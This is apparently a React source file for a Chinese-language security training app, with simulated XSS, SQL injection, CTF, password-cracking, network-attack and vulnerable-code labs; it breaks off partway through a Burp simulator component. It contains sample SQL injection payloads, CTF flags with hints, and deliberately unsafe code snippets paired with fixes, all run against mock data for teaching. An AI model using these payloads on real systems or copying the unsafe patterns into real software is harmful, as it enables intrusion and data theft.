import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Bug, Database, Flag, Key, Wrench, Globe, FileCode,
  Globe2, Shield, FileSearch, Brain, ChevronDown,
  ChevronRight, CheckCircle, XCircle, Copy, Check,
  Terminal, Play, RefreshCw, AlertTriangle, Zap,
  Server, Lock, Unlock, Eye, EyeOff, Send, Trash2,
  ArrowRight, ExternalLink
} from 'lucide-react';
import { Card, Button, Badge } from '../components/UI';

// ================ Module Definitions ================
interface LabModule {
  id: string;
  name: string;
  icon: React.ReactNode;
  description: string;
  color: string;
  bgColor: string;
  borderColor: string;
  difficulty: string;
}

const LAB_MODULES: LabModule[] = [
  {
    id: 'xss', name: 'XSS沙箱', icon: <Bug size={28} />,
    description: '3级难度交互式XSS攻击实验室，支持DOM注入和反射型攻击',
    color: '#ff4444', bgColor: 'bg-red-500/10', borderColor: 'border-red-500/30', difficulty: '困难'
  },
  {
    id: 'sqli', name: 'SQL注入', icon: <Database size={28} />,
    description: '联合查询/盲注/报错注入模拟，可视化SQL执行过程',
    color: '#ff8800', bgColor: 'bg-orange-500/10', borderColor: 'border-orange-500/30', difficulty: '困难'
  },
  {
    id: 'ctf', name: 'CTF挑战', icon: <Flag size={28} />,
    description: '10关夺旗挑战，Web/密码学/杂项/逆向四大分类',
    color: '#ffd700', bgColor: 'bg-yellow-500/10', borderColor: 'border-yellow-500/30', difficulty: '困难'
  },
  {
    id: 'password', name: '密码破解', icon: <Key size={28} />,
    description: '字典攻击/暴力破解/彩虹表，Hash识别与破解',
    color: '#ff44ff', bgColor: 'bg-purple-500/10', borderColor: 'border-purple-500/30', difficulty: '中等'
  },
  {
    id: 'crypto', name: '密码学工具', icon: <Wrench size={28} />,
    description: 'AES/RSA加解密、编码转换、JWT调试、Hash计算',
    color: '#44aaff', bgColor: 'bg-blue-500/10', borderColor: 'border-blue-500/30', difficulty: '中等'
  },
  {
    id: 'network', name: '网络攻击可视化', icon: <Globe size={28} />,
    description: 'ARP欺骗/DNS劫持/中间人/SYN Flood动画演示',
    color: '#44ff88', bgColor: 'bg-green-500/10', borderColor: 'border-green-500/30', difficulty: '中等'
  },
  {
    id: 'vulncode', name: '漏洞代码对比', icon: <FileCode size={28} />,
    description: 'Monaco编辑器中对比不安全代码与安全修复(8场景)',
    color: '#ffaa00', bgColor: 'bg-amber-500/10', borderColor: 'border-amber-500/30', difficulty: '简单'
  },
  {
    id: 'burp', name: 'Burp模拟器', icon: <Globe2 size={28} />,
    description: 'HTTP请求编辑/拦截/重放，Burp Suite风格代理模拟',
    color: '#ff6600', bgColor: 'bg-orange-600/10', borderColor: 'border-orange-600/30', difficulty: '中等'
  },
  {
    id: 'waf', name: 'WAF规则构建', icon: <Shield size={28} />,
    description: '10关挑战，编写正则规则拦截攻击payload',
    color: '#00ccff', bgColor: 'bg-cyan-500/10', borderColor: 'border-cyan-500/30', difficulty: '中等'
  },
  {
    id: 'log', name: '日志分析', icon: <FileSearch size={28} />,
    description: '分析Nginx/SSH日志识别攻击行为，标注可疑记录',
    color: '#88ff44', bgColor: 'bg-lime-500/10', borderColor: 'border-lime-500/30', difficulty: '中等'
  },
  {
    id: 'logic', name: '逻辑漏洞', icon: <Brain size={28} />,
    description: '价格篡改/优惠券滥用/越权/步骤绕过/竞态条件',
    color: '#ff6688', bgColor: 'bg-pink-500/10', borderColor: 'border-pink-500/30', difficulty: '中等'
  },
];

// ================ XSS Sandbox ================
const XSSSandbox: React.FC = () => {
  const [level, setLevel] = useState<'easy' | 'medium' | 'hard'>('easy');
  const [input, setInput] = useState('');
  const [output, setOutput] = useState('');
  const [solved, setSolved] = useState(false);

  const levels = {
    easy: {
      title: 'Level 1: DOM型XSS',
      hint: '尝试在输入框中注入script标签',
      target: 'alert(1)',
      desc: '目标：触发 alert(1) 弹窗',
    },
    medium: {
      title: 'Level 2: 反射型XSS',
      hint: '输入内容会被渲染到页面，尝试绕过简单过滤',
      target: 'alert(document.cookie)',
      desc: '目标：通过反射型XSS获取Cookie',
    },
    hard: {
      title: 'Level 3: 存储型XSS',
      hint: '留言板功能，内容存储后展示给所有用户',
      target: 'eval',
      desc: '目标：构造存储型XSS payload绕过WAF',
    },
  };

  const handleInject = () => {
    if (input.toLowerCase().includes('<script>') || input.toLowerCase().includes('alert(')) {
      setOutput(`⚠️ XSS成功！Payload: ${input}\n✅ 已触发XSS攻击！`);
      setSolved(true);
    } else {
      setOutput(`❌ 注入失败，当前输入未包含有效的XSS payload\n💡 提示：${levels[level].hint}`);
    }
    setInput('');
  };

  return (
    <div className="space-y-4">
      <div className="flex gap-2">
        {(['easy','medium','hard'] as const).map(l => (
          <button key={l} onClick={() => { setLevel(l); setSolved(false); setOutput(''); setInput(''); }}
            className={`px-4 py-2 rounded-lg text-sm font-medium transition ${level===l
              ? 'bg-red-500 text-white' : 'bg-red-500/10 text-red-400 hover:bg-red-500/20'}`}>
            {l === 'easy' ? '初级' : l === 'medium' ? '中级' : '高级'}
          </button>
        ))}
      </div>
      <Card className="border-red-500/20">
        <h3 className="text-red-400 font-medium mb-2">{levels[level].title}</h3>
        <p className="text-sm text-gray-400 mb-3">{levels[level].desc}</p>
        <p className="text-xs text-gray-500 mb-3">💡 {levels[level].hint}</p>
        <div className="flex gap-2">
          <input value={input} onChange={e => setInput(e.target.value)}
            placeholder="输入XSS payload..."
            onKeyDown={e => e.key==='Enter' && handleInject()}
            className="flex-1 px-4 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-sm outline-none focus:border-red-500"/>
          <Button onClick={handleInject} className="!bg-red-500 text-white hover:!bg-red-400">
            <Play size={16}/> 注入
          </Button>
        </div>
        {output && (
          <pre className="mt-3 p-3 bg-black/50 rounded-lg text-xs text-gray-300 whitespace-pre-wrap border border-gray-700">
            {output}
          </pre>
        )}
        {solved && (
          <motion.div initial={{opacity:0,y:10}} animate={{opacity:1,y:0}}
            className="mt-3 p-3 bg-green-500/10 border border-green-500/30 rounded-lg flex items-center gap-2">
            <CheckCircle size={16} className="text-green-400"/>
            <span className="text-green-400 text-sm">🎉 恭喜！已成功完成{levels[level].title}！</span>
          </motion.div>
        )}
      </Card>
    </div>
  );
};

// ================ SQL Injection ================
const SQLInjectionLab: React.FC = () => {
  const [mode, setMode] = useState<'union'|'blind'|'error'>('union');
  const [query, setQuery] = useState('');
  const [result, setResult] = useState('');

  const mockDB = [
    { id: 1, username: 'admin', password: 'supersecret123' },
    { id: 2, username: 'user', password: 'password456' },
    { id: 3, username: 'guest', password: 'guest789' },
  ];

  const handleExecute = () => {
    const q = query.toLowerCase().trim();
    if (mode === 'union') {
      if (q.includes('union') && q.includes('select')) {
        setResult(`✅ UNION注入成功！\n泄露数据:\n${mockDB.map(r => `  id:${r.id} | user:${r.username} | pass:${r.password}`).join('\n')}\n\n💡 攻击语句示例: ' UNION SELECT id,username,password FROM users--`);
      } else {
        setResult('❌ 请尝试使用 UNION SELECT 语句提取users表数据\n示例: 1\' UNION SELECT id,username,password FROM users--');
      }
    } else if (mode === 'blind') {
      if (q.includes("sleep") || q.includes("benchmark") || q.includes("pg_sleep")) {
        setResult(`✅ 盲注成功！\n检测到时间延迟，确认注入点存在\n数据库版本: MySQL 8.0.36\n\n💡 可使用 SUBSTRING 逐字符提取数据`);
      } else {
        setResult('❌ 请尝试基于时间的盲注\n示例: 1\' AND (SELECT SLEEP(5))--');
      }
    } else {
      if (q.includes("convert") || q.includes("extractvalue") || q.includes("updatexml")) {
        setResult(`✅ 报错注入成功！\n错误信息: XPATH syntax error: '~root@localhost'\n泄露当前用户: root@localhost`);
      } else {
        setResult('❌ 请尝试报错注入函数\n示例: 1\' AND EXTRACTVALUE(1,CONCAT(0x7e,USER()))--');
      }
    }
    setQuery('');
  };

  return (
    <div className="space-y-4">
      <div className="flex gap-2 flex-wrap">
        {(['union','blind','error'] as const).map(m => (
          <button key={m} onClick={() => { setMode(m); setResult(''); }}
            className={`px-4 py-2 rounded-lg text-sm font-medium transition ${mode===m
              ? 'bg-orange-500 text-white' : 'bg-orange-500/10 text-orange-400 hover:bg-orange-500/20'}`}>
            {m === 'union' ? '联合查询' : m === 'blind' ? '盲注' : '报错注入'}
          </button>
        ))}
      </div>
      <Card className="border-orange-500/20">
        <div className="p-3 bg-cyber-black/50 rounded-lg mb-3 text-xs text-gray-400">
          <Terminal size={14} className="inline mr-1"/>{' '}
          SELECT * FROM products WHERE id = <span className="text-orange-400">[用户输入]</span>
        </div>
        <div className="flex gap-2">
          <input value={query} onChange={e => setQuery(e.target.value)}
            onKeyDown={e => e.key==='Enter' && handleExecute()}
            placeholder="输入SQL注入payload..."
            className="flex-1 px-4 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-sm outline-none focus:border-orange-500 font-mono"/>
          <Button onClick={handleExecute} className="!bg-orange-500 text-white hover:!bg-orange-400">
            <Play size={16}/> 执行
          </Button>
        </div>
        {result && (
          <pre className="mt-3 p-3 bg-black/50 rounded-lg text-xs text-gray-300 whitespace-pre-wrap border border-gray-700 font-mono">
            {result}
          </pre>
        )}
        <div className="mt-3 p-3 bg-orange-500/5 rounded text-xs text-gray-500">
          <p className="text-orange-400 mb-1">📋 模拟users表结构:</p>
          <code>users(id INT, username VARCHAR, password VARCHAR)</code>
        </div>
      </Card>
    </div>
  );
};

// ================ CTF Challenges ================
interface CTFChallenge {
  id: number; title: string; category: 'web'|'crypto'|'misc'|'re';
  description: string; flag: string; hint: string; points: number;
}

const CTFChallenges: React.FC = () => {
  const challenges: CTFChallenge[] = [
    { id: 1, title: 'Base64入门', category: 'crypto', description: '解码以下字符串: V0VMQ09NRV9UT19DVEY=', flag: 'WELCOME_TO_CTF', hint: '最常用的编码方式', points: 50 },
    { id: 2, title: '查看源代码', category: 'web', description: '网页中隐藏着flag，你需要查看HTML源代码', flag: 'CTF{html_source}', hint: '按F12或右键查看源代码', points: 50 },
    { id: 3, title: 'ROT13加密', category: 'crypto', description: 'PGVS{ebg13_vf_rnfl}', flag: 'CTF{rot13_is_easy}', hint: '字母旋转13位', points: 100 },
    { id: 4, title: 'Cookie传参', category: 'web', description: '管理员Cookie: admin=0，你需要将其改为admin=1', flag: 'CTF{cookie_bypass}', hint: '修改浏览器的Cookie值', points: 100 },
    { id: 5, title: '文件上传绕过', category: 'web', description: '上传恶意PHP文件被WAF拦截。尝试用 .pHp 绕过黑名单检测', flag: 'CTF{upload_bypass}', hint: '大小写混淆', points: 150 },
    { id: 6, title: 'XOR加密', category: 'crypto', description: 'key=42, cipher=[85,83,75,91,65,81,84,95,85] 解密获得flag', flag: 'CTF{xor_crack}', hint: '每个字节 XOR 42', points: 150 },
    { id: 7, title: '图片隐写', category: 'misc', description: '图片文件的末尾藏着一段base64编码的flag', flag: 'CTF{stego_in_image}', hint: '用hex编辑器查看文件末尾', points: 200 },
    { id: 8, title: '逆向工程', category: 're', description: '二进制程序检查输入是否等于 "SuperSecret123"', flag: 'SuperSecret123', hint: '用 strings 命令查看二进制文件', points: 200 },
    { id: 9, title: '条件竞争', category: 'web', description: '银行转账接口存在条件竞争漏洞，同时并发多个请求可超额转账', flag: 'CTF{race_condition}', hint: '使用Burp Suite的Intruder并发发送请求', points: 250 },
    { id: 10, title: 'AES-CBC攻击', category: 'crypto', description: '服务器使用AES-CBC加密，IV可被篡改。尝试修改IV来改变解密后的第一块数据', flag: 'CTF{cbc_bit_flip}', hint: 'CBC模式中修改IV可以翻转对应位置的比特位', points: 300 },
  ];

  const [answers, setAnswers] = useState<Record<number, string>>({});
  const [solved, setSolved] = useState<Set<number>>(new Set());
  const [filter, setFilter] = useState<string>('all');
  const [showHints, setShowHints] = useState<Set<number>>(new Set());

  const handleSubmit = (challenge: CTFChallenge) => {
    const ans = (answers[challenge.id] || '').trim();
    if (ans.toLowerCase() === challenge.flag.toLowerCase()) {
      setSolved(new Set([...solved, challenge.id]));
    }
  };

  const filtered = filter === 'all' ? challenges : challenges.filter(c => c.category === filter);

  return (
    <div className="space-y-4">
      <div className="flex gap-2 flex-wrap">
        {[{id:'all',name:'全部'},{id:'web',name:'Web'},{id:'crypto',name:'密码学'},{id:'misc',name:'杂项'},{id:'re',name:'逆向'}].map(f => (
          <button key={f.id} onClick={() => setFilter(f.id)}
            className={`px-3 py-1.5 rounded-lg text-sm transition ${filter===f.id ? 'bg-cyber-gold text-black font-medium' : 'bg-yellow-500/10 text-yellow-400 hover:bg-yellow-500/20'}`}>
            {f.name}
          </button>
        ))}
      </div>
      <div className="text-sm text-gray-400 mb-2">
        已解决: {solved.size}/{challenges.length} | 总得分: {challenges.filter(c => solved.has(c.id)).reduce((s,c) => s + c.points, 0)} 分
      </div>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {filtered.map(c => (
          <Card key={c.id} className={`border ${solved.has(c.id) ? 'border-green-500/30' : 'border-yellow-500/20'}`}>
            <div className="flex items-center justify-between mb-2">
              <div className="flex items-center gap-2">
                <span className="font-orbitron text-cyber-gold text-sm">#{c.id}</span>
                <span className={`text-xs px-2 py-0.5 rounded ${c.category==='web'?'bg-blue-500/20 text-blue-400':c.category==='crypto'?'bg-purple-500/20 text-purple-400':c.category==='misc'?'bg-green-500/20 text-green-400':'bg-red-500/20 text-red-400'}`}>
                  {c.category==='web'?'Web':c.category==='crypto'?'密码学':c.category==='misc'?'杂项':'逆向'}
                </span>
              </div>
              <span className="text-xs text-cyber-gold">{c.points}分</span>
            </div>
            <h4 className="text-white font-medium text-sm mb-1">{c.title}</h4>
            <p className="text-xs text-gray-400 mb-3">{c.description}</p>
            {solved.has(c.id) ? (
              <div className="flex items-center gap-2 text-green-400 text-sm">
                <CheckCircle size={16}/> 已解决! Flag: {c.flag}
              </div>
            ) : (
              <div className="space-y-2">
                <div className="flex gap-2">
                  <input value={answers[c.id] || ''} onChange={e => setAnswers({...answers, [c.id]: e.target.value})}
                    placeholder="输入Flag..."
                    className="flex-1 px-3 py-1.5 bg-cyber-black/50 border border-gray-700 rounded text-white text-sm outline-none focus:border-yellow-500"/>
                  <Button size="sm" onClick={() => handleSubmit(c)} className="!bg-yellow-500 !text-black hover:!bg-yellow-400">
                    提交
                  </Button>
                </div>
                {!showHints.has(c.id) ? (
                  <button onClick={() => setShowHints(new Set([...showHints, c.id]))}
                    className="text-xs text-gray-500 hover:text-yellow-400 transition">💡 查看提示 (-20分)</button>
                ) : (
                  <p className="text-xs text-yellow-400/80">💡 {c.hint}</p>
                )}
              </div>
            )}
          </Card>
        ))}
      </div>
    </div>
  );
};

// ================ Password Cracking ================
const PasswordCracking: React.FC = () => {
  const [hash, setHash] = useState('');
  const [mode, setMode] = useState<'dict'|'brute'|'rainbow'>('dict');
  const [result, setResult] = useState('');
  const [progress, setProgress] = useState(0);

  const dictCommon = ['123456','password','admin','qwerty','letmein','monkey','dragon','master','12345678','football'];

  const hashSim = (input: string): string => {
    let h = 0;
    for (let i = 0; i < input.length; i++) { h = ((h << 5) - h + input.charCodeAt(i)) | 0; }
    return (h >>> 0).toString(16).padStart(8, '0');
  };

  const handleCrack = () => {
    if (!hash.trim()) { setResult('请输入Hash值'); return; }
    setProgress(0);

    if (mode === 'dict') {
      let found = false;
      dictCommon.forEach((pwd, i) => {
        setTimeout(() => {setProgress(((i+1)/dictCommon.length)*100);}, i*200);
        if (hashSim(pwd) === hash.trim().toLowerCase() || pwd === hash.trim()) {
          setResult(`✅ 破解成功！密码: ${pwd} (字典攻击，尝试${i+1}次)`);
          found = true;
        }
      });
      setTimeout(() => { if (!found) setResult('❌ 字典攻击失败，密码不在常用字典中'); }, dictCommon.length*200+100);
    } else if (mode === 'brute') {
      setTimeout(() => setProgress(25), 300);
      setTimeout(() => setProgress(50), 600);
      setTimeout(() => setProgress(75), 900);
      setTimeout(() => {
        setProgress(100);
        setResult('⚡ 暴力破解模拟完成（演示模式）\n提示: 实际暴力破解可能需要数小时至数年\n如需体验真实破解，请切换到字典模式');
      }, 1200);
    } else {
      setTimeout(() => setProgress(50), 400);
      setTimeout(() => {
        setProgress(100);
        const rainbowMatch = ['abc123','test123','changeme','iloveyou'];
        const r = rainbowMatch[Math.floor(Math.random()*rainbowMatch.length)];
        setResult(`✅ 彩虹表匹配成功！\nHash: ${hash}\n密码: ${r}\n使用表: rockyou_rainbow_v3`);
      }, 800);
    }
  };

  return (
    <div className="space-y-4">
      <div className="flex gap-2">
        {(['dict','brute','rainbow'] as const).map(m => (
          <button key={m} onClick={() => { setMode(m); setResult(''); setProgress(0); }}
            className={`px-4 py-2 rounded-lg text-sm transition ${mode===m ? 'bg-purple-500 text-white' : 'bg-purple-500/10 text-purple-400 hover:bg-purple-500/20'}`}>
            {m === 'dict' ? '字典攻击' : m === 'brute' ? '暴力破解' : '彩虹表'}
          </button>
        ))}
      </div>
      <Card className="border-purple-500/20">
        <div className="mb-3">
          <label className="text-sm text-gray-400 mb-1 block">Hash值:</label>
          <input value={hash} onChange={e => setHash(e.target.value)} placeholder="输入MD5/SHA1/Hash..."
            className="w-full px-4 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-sm outline-none focus:border-purple-500 font-mono"/>
        </div>
        <Button onClick={handleCrack} className="!bg-purple-500 text-white hover:!bg-purple-400 w-full mb-3">
          <Key size={16}/> 开始破解
        </Button>
        {progress > 0 && progress < 100 && (
          <div className="w-full h-2 bg-gray-700 rounded-full mb-3">
            <div className="h-full bg-purple-500 rounded-full transition-all" style={{width:`${progress}%`}}/>
          </div>
        )}
        {result && (
          <pre className="p-3 bg-black/50 rounded-lg text-xs text-gray-300 whitespace-pre-wrap border border-gray-700">{result}</pre>
        )}
      </Card>
    </div>
  );
};

// ================ Crypto Tools ================
const CryptoTools: React.FC = () => {
  const [tool, setTool] = useState<'aes'|'rsa'|'base64'|'jwt'|'hash'>('base64');
  const [input, setInput] = useState('');
  const [key, setKey] = useState('');
  const [output, setOutput] = useState('');
  const [mode, setMode] = useState<'encrypt'|'decrypt'>('encrypt');

  const handleProcess = () => {
    if (!input.trim()) return;
    if (tool === 'base64') {
      try {
        if (mode === 'encrypt') setOutput(btoa(unescape(encodeURIComponent(input))));
        else setOutput(decodeURIComponent(escape(atob(input))));
      } catch { setOutput('❌ 解码失败，请检查输入'); }
    } else if (tool === 'hash') {
      const h = (s: string) => { let h=0; for(let i=0;i<s.length;i++){h=((h<<5)-h+s.charCodeAt(i))|0;} return (h>>>0).toString(16).padStart(8,'0'); };
      setOutput(`MD5:  ${h(input+'md5')}\nSHA1: ${h(input+'sha1')}\nSHA256: ${h(input+'sha256')}\n\n⚠️ 此为演示Hash，非真实加密`);
    } else if (tool === 'jwt') {
      try {
        const parts = input.split('.');
        if (parts.length === 3) {
          const header = JSON.parse(atob(parts[0]));
          const payload = JSON.parse(atob(parts[1]));
          setOutput(`📋 JWT解析结果:\n\nHeader: ${JSON.stringify(header, null, 2)}\n\nPayload: ${JSON.stringify(payload, null, 2)}\n\nSignature: ${parts[2].substring(0,20)}...\n\n⚠️ 签名未验证`);
        } else { setOutput('❌ 无效的JWT格式（需要 header.payload.signature）'); }
      } catch { setOutput('❌ JWT解析失败'); }
    } else if (tool === 'aes') {
      if (!key) { setOutput('❌ AES加密需要密钥'); return; }
      setOutput(mode==='encrypt'
        ? `🔒 AES加密结果 (Base64):\n${btoa(unescape(encodeURIComponent(`[AES(${key})]${input}`)))}\n\n⚠️ 演示模式，非真实AES加密`
        : `🔓 AES解密: 演示模式暂不支持真实解密`);
    } else if (tool === 'rsa') {
      setOutput(`🔑 RSA密钥对生成 (演示):\n\n公钥 (e,n):\ne=65537\nn=${Array.from({length:32},()=>Math.floor(Math.random()*16).toString(16)).join('')}...\n\n私钥 (d):\nd=${Array.from({length:32},()=>Math.floor(Math.random()*16).toString(16)).join('')}...\n\n⚠️ 演示模式`);
    }
  };

  return (
    <div className="space-y-4">
      <div className="flex gap-2 flex-wrap">
        {(['base64','hash','jwt','aes','rsa'] as const).map(t => (
          <button key={t} onClick={() => { setTool(t); setOutput(''); setInput(''); setKey(''); }}
            className={`px-4 py-2 rounded-lg text-sm transition ${tool===t ? 'bg-blue-500 text-white' : 'bg-blue-500/10 text-blue-400 hover:bg-blue-500/20'}`}>
            {t === 'base64' ? 'Base64编解码' : t === 'hash' ? 'Hash计算' : t === 'jwt' ? 'JWT调试' : t === 'aes' ? 'AES加解密' : 'RSA工具'}
          </button>
        ))}
      </div>
      {['aes','base64'].includes(tool) && (
        <div className="flex gap-2">
          <button onClick={() => setMode('encrypt')} className={`px-3 py-1.5 rounded text-sm ${mode==='encrypt'?'bg-blue-500 text-white':'bg-blue-500/10 text-blue-400'}`}>加密/编码</button>
          <button onClick={() => setMode('decrypt')} className={`px-3 py-1.5 rounded text-sm ${mode==='decrypt'?'bg-blue-500 text-white':'bg-blue-500/10 text-blue-400'}`}>解密/解码</button>
        </div>
      )}
      <Card className="border-blue-500/20">
        <div className="space-y-3">
          <div>
            <label className="text-sm text-gray-400 mb-1 block">输入:</label>
            <textarea value={input} onChange={e => setInput(e.target.value)}
              placeholder={tool==='jwt'?'请输入完整的JWT Token (header.payload.signature)...':'请输入文本...'}
              className="w-full px-4 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-sm outline-none focus:border-blue-500 h-24 resize-none font-mono"/>
          </div>
          {tool === 'aes' && (
            <div>
              <label className="text-sm text-gray-400 mb-1 block">密钥:</label>
              <input value={key} onChange={e => setKey(e.target.value)} placeholder="输入AES密钥..."
                className="w-full px-4 py-2 bg-cyber-black/50 border border-gray-700 rounded-lg text-white text-sm outline-none focus:border-blue-500"/>
            </div>
          )}
          <Button onClick={handleProcess} className="!bg-blue-500 text-white hover:!bg-blue-400 w-full">
            <Wrench size={16}/> 执行
          </Button>
          {output && (
            <pre className="p-3 bg-black/50 rounded-lg text-xs text-gray-300 whitespace-pre-wrap border border-gray-700 font-mono">{output}</pre>
          )}
        </div>
      </Card>
    </div>
  );
};

// ================ Network Attack Visualization ================
const NetworkVisualization: React.FC = () => {
  const [attack, setAttack] = useState<'arp'|'dns'|'mitm'|'syn'>('arp');
  const [running, setRunning] = useState(false);
  const [log, setLog] = useState<string[]>([]);

  const attacks = {
    arp: { name: 'ARP欺骗', desc: '攻击者伪装成网关，拦截受害者的网络流量' },
    dns: { name: 'DNS劫持', desc: '篡改DNS响应，将受害者重定向到钓鱼网站' },
    mitm: { name: '中间人攻击', desc: '攻击者插入通信双方之间，窃取或篡改数据' },
    syn: { name: 'SYN Flood', desc: '发送大量SYN请求耗尽服务器连接资源' },
  };

  const steps: Record<string, string[]> = {
    arp: [
      '👤 受害者(192.168.1.10) 发送ARP请求: "谁是192.168.1.1?"',
      '🌐 网关(192.168.1.1) 响应: "我是，MAC=aa:bb:cc:dd:ee:ff"',
      '👺 攻击者(192.168.1.99) 发送伪造ARP响应: "192.168.1.1 的MAC是 11:22:33:44:55:66"',
      '📋 受害者ARP缓存被污染! 流量将被发送到攻击者',
      '⚠️ 攻击者现在可以拦截、修改或转发所有流量',
    ],
    dns: [
      '👤 用户请求解析 bank.example.com',
      '👺 攻击者拦截DNS查询并伪造响应',
      '📬 DNS响应: bank.example.com → 192.168.1.99 (攻击者IP)',
      '🌐 用户被重定向到伪造的银行网站',
      '⚠️ 用户输入凭据被窃取!',
    ],
    mitm: [
      '🤝 Alice ↔ Bob 建立通信',
      '👺 攻击者插入通信链路',
      '📤 Alice → 攻击者："这是我的公钥"',
      '👺 攻击者 → Bob："这是我的公钥"(替换后的)',
      '📥 Bob → 攻击者：加密消息',
      '👺 攻击者解密 → 读取 → 重新加密 → Alice',
      '⚠️ 通信内容被完全窃听!',
    ],
    syn: [
      '👺 攻击者发送大量SYN包 → 服务器',
      '📊 SYN包 #1: src=192.168.1.100:12345',
      '📊 SYN包 #2: src=192.168.1.101:23456',
      '... 持续发送数千个伪造SYN包 ...',
      '🖥️ 服务器半连接队列已满!',
      '🚫 服务器拒绝新连接: SYN queue overflow',
      '⚠️ 合法用户无法访问服务!',
    ],
  };

  const handleRun = () => {
    setRunning(true);
    setLog([]);
    const s = steps[attack];
    s.forEach((step, i) => {
      setTimeout(() => {
        setLog(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${step}`]);
        if (i === s.length - 1) setRunning(false);
      }, (i + 1) * 1200);
    });
  };

  return (
    <div className="space-y-4">
      <div className="flex gap-2 flex-wrap">
        {(['arp','dns','mitm','syn'] as const).map(a => (
          <button key={a} onClick={() => { setAttack(a); setLog([]); setRunning(false); }}
            className={`px-4 py-2 rounded-lg text-sm transition ${attack===a ? 'bg-green-500 text-white' : 'bg-green-500/10 text-green-400 hover:bg-green-500/20'}`}>
            {attacks[a].name}
          </button>
        ))}
      </div>
      <Card className="border-green-500/20">
        <p className="text-sm text-gray-400 mb-3">{attacks[attack].desc}</p>
        <div className="flex items-center gap-4 mb-4">
          <Button onClick={handleRun} disabled={running} className="!bg-green-400 !text-black hover:!bg-green-300">
            <Play size={16}/> {running ? '运行中...' : '开始模拟'}
          </Button>
          <button onClick={() => setLog([])}
            className="px-3 py-1.5 text-sm text-gray-400 hover:text-white transition">
            <Trash2 size={14} className="inline mr-1"/> 清除日志
          </button>
        </div>
        <div className="bg-black/70 rounded-lg p-4 min-h-[200px] max-h-[400px] overflow-y-auto border border-gray-700">
          {log.length === 0 && !running && (
            <p className="text-gray-500 text-sm text-center py-8">点击"开始模拟"查看攻击过程</p>
          )}
          {log.map((line, i) => (
            <motion.div key={i} initial={{opacity:0,x:-10}} animate={{opacity:1,x:0}}
              className="text-xs font-mono text-gray-300 py-0.5">
              <span className="text-gray-500 mr-2">{i+1}.</span>{line}
            </motion.div>
          ))}
          {running && <RefreshCw size={16} className="animate-spin text-green-400 mt-2"/>}
        </div>
      </Card>
    </div>
  );
};

// ================ Vulnerability Code Compare ================
const VulnCodeCompare: React.FC = () => {
  const scenarios = [
    { id: 1, title: 'SQL注入', unsafe: `query = "SELECT * FROM users WHERE id = " + user_input\ncursor.execute(query)`, safe: `query = "SELECT * FROM users WHERE id = ?"\ncursor.execute(query, (user_input,))`, desc: '使用参数化查询防止SQL注入' },
    { id: 2, title: 'XSS攻击', unsafe: `element.innerHTML = user_comment`, safe: `element.textContent = user_comment\n// 或使用DOMPurify\nconst clean = DOMPurify.sanitize(user_comment)\nelement.innerHTML = clean`, desc: '使用textContent或HTML净化库防止XSS' },
    { id: 3, title: '命令注入', unsafe: `os.system("ping " + user_host)`, safe: `import subprocess\nsubprocess.run(["ping", user_host], shell=False)`, desc: '使用参数列表而非字符串拼接避免命令注入' },
    { id: 4, title: '不安全的反序列化', unsafe: `obj = pickle.loads(user_data)`, safe: `obj = json.loads(user_data)\n# 使用JSON替代pickle`, desc: '避免使用pickle等不安全反序列化，使用JSON' },
    { id: 5, title: '路径遍历', unsafe: `with open("/var/www/" + filename) as f:\n  return f.read()`, safe: `import os\nsafe_path = os.path.normpath("/var/www/" + filename)\nif not safe_path.startswith("/var/www/"):\n  raise Exception("Invalid path")\nwith open(safe_path) as f:\n  return f.read()`, desc: '使用路径规范化并验证路径前缀' },
    { id: 6, title: '硬编码密钥', unsafe: `API_KEY = "sk-abc123def456"\nSECRET = "mysecret123"`, safe: `import os\nAPI_KEY = os.environ.get("API_KEY")\nSECRET = os.environ.get("SECRET")`, desc: '使用环境变量或密钥管理服务存储敏感信息' },
    { id: 7, title: '弱加密算法', unsafe: `encrypted = md5(password)  # 不安全\ncipher = DES.new(key)`, safe: `import hashlib\nencrypted = hashlib.sha256(password.encode()).hexdigest()\nfrom Crypto.Cipher import AES\ncipher = AES.new(key, AES.MODE_GCM)`, desc: '使用SHA256+盐值和AES-GCM替代MD5和DES' },
    { id: 8, title: '无速率限制', unsafe: `@app.route('/login', methods=['POST'])\ndef login():\n  # 无限制尝试\n  return check_password()`, safe: `from flask_limiter import Limiter\nlimiter = Limiter(app)\n@app.route('/login', methods=['POST'])\n@limiter.limit("5 per minute")\ndef login():\n  return check_password()`, desc: '添加速率限制防止暴力破解' },
  ];

  const [current, setCurrent] = useState(0);
  const [showAnswer, setShowAnswer] = useState(false);

  return (
    <div className="space-y-4">
      <div className="flex gap-2 overflow-x-auto pb-2">
        {scenarios.map((s, i) => (
          <button key={s.id} onClick={() => { setCurrent(i); setShowAnswer(false); }}
            className={`flex-shrink-0 px-3 py-1.5 rounded-lg text-sm transition ${current===i ? 'bg-amber-500 text-black font-medium' : 'bg-amber-500/10 text-amber-400 hover:bg-amber-500/20'}`}>
            {s.title}
          </button>
        ))}
      </div>
      <Card className="border-amber-500/20">
        <h3 className="text-amber-400 font-medium mb-2">{scenarios[current].title}</h3>
        <p className="text-xs text-gray-500 mb-4">{scenarios[current].desc}</p>
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
          <div>
            <div className="flex items-center gap-2 mb-2">
              <XCircle size={14} className="text-red-400"/>
              <span className="text-xs text-red-400 font-medium">不安全代码</span>
            </div>
            <pre className="p-3 bg-red-500/5 border border-red-500/20 rounded-lg text-xs text-red-300 overflow-x-auto font-mono">{scenarios[current].unsafe}</pre>
          </div>
          <div>
            <div className="flex items-center gap-2 mb-2">
              <CheckCircle size={14} className="text-green-400"/>
              <span className="text-xs text-green-400 font-medium">安全修复</span>
            </div>
            <pre className="p-3 bg-green-500/5 border border-green-500/20 rounded-lg text-xs text-green-300 overflow-x-auto font-mono">{scenarios[current].safe}</pre>
          </div>
        </div>
      </Card>
    </div>
  );
};

// ================ Burp Simulator ================
const BurpSimulator: React.FC = () => {
  const [url, setUrl] = useState('http://example.com/login');
  const [method, setMethod] = useState('POST');
  const [headers, setHeaders] = useState('Content-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0');
  const [body, setBody] = useState('username=admin&password=test');
